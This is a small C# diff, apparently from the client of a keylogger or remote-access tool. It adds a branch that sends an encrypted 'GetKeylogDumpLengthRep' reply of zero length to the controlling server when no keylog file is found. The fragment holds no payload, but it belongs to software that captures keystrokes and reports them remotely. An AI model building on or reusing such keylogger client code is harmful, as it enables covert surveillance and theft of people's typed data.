@@ -32,6 +32,15 @@ namespace Client.Core.Events
             else
             {
                 //NO FILE
+                if (NetworkManager.IsConnected)
+                {
+                    NetworkManager.Connection.SendObject("GetKeylogDumpLengthRep",
+                        Cryptography.Encrypt(JsonConvert.SerializeObject(0)));
+                }
+                else
+                {
+                    //TODO, Buffer / Packet queue of some sort
+                }
             }
         }
     }
